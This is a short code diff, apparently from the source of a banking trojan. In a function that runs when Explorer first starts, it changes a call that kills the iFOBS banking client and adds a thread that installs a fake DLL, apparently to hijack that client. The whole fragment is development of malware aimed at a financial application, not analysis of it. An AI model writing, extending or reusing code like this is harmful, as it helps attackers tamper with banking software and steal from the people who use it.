@@ -49,8 +49,8 @@ void ExplorerFirstStart(PEventData Data)
 	#endif
 
 	#ifdef IFobsH
-//		RunThread( IFobs::FindIFobsClient, 0 );
-		IFobs::KillIFobs();
+		IFobs::KillIFobs(0);
+		RunThread( IFobs::IntallFakeDll,0 );
 	#endif
 
 	//ExecuteDocFind( 0, 0, 0 );
